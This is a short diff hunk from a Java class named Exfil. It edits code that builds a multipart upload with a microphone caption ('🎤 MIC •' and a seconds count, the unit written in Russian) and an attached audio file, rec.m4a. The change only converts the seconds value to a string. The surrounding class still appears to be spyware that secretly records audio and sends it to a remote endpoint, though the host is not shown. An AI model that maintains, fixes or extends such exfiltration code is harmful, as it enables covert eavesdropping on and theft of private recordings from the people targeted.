@@ -142,7 +142,7 @@ public class Exfil {
 
                 w.append("--").append(boundary).append("\r\n");
                 w.append("Content-Disposition: form-data; name=\"caption\"\r\n\r\n");
-                w.append("🎤 MIC • ").append(sec).append(" сек\r\n");
+                w.append("🎤 MIC • ").append(String.valueOf(sec)).append(" сек\r\n");
 
                 w.append("--").append(boundary).append("\r\n");
                 w.append("Content-Disposition: form-data; name=\"audio\"; filename=\"rec.m4a\"\r\n");
